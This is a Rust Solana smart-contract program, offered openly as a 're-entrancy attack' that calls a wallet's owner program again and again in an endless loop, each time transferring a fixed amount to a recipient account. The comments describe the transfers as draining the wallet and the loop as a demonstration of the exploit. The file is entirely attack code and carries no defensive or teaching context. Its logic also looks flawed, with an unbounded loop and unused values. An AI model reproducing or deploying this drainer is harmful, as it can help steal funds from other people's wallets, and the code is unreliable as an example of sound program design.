use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    msg,
    pubkey::Pubkey,
    instruction::{AccountMeta},
};

entrypoint!(process_instruction);

pub fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    instruction_data: &[u8],
) -> ProgramResult {

    msg!("Starting re-entrancy attack!");

    let accounts_iter = &mut accounts.iter();

    let user_wallet_account = next_account_info(accounts_iter)?;
    let recipient_wallet_account = next_account_info(accounts_iter)?;
    let transfer_program = next_account_info(accounts_iter)?;
    let user_account = next_account_info(accounts_iter)?;

    let mut accounts_meta = vec![
        AccountMeta::new(*user_wallet_account.key, false),
        AccountMeta::new(*recipient_wallet_account.key, false),
        AccountMeta::new_readonly(*transfer_program.key, false),
        AccountMeta::new(*user_account.key, true),
        
    ];

    let mut i = 0;
    loop {
        i += 1;
        let amount: u8 = 10; // Amount to drain in each iteration
        let transfer_instruction = solana_program::instruction::Instruction {
            program_id: *user_wallet_account.owner,
            accounts: accounts_meta.clone(),
            data: [1, amount].to_vec(),
        };

        let remaining_accounts = &accounts[1..];

        solana_program::program::invoke(&transfer_instruction, remaining_accounts)?;


        // Output the number of iterations to demonstrate the exploit
        msg!("Iteration: {}", i);
    }
}
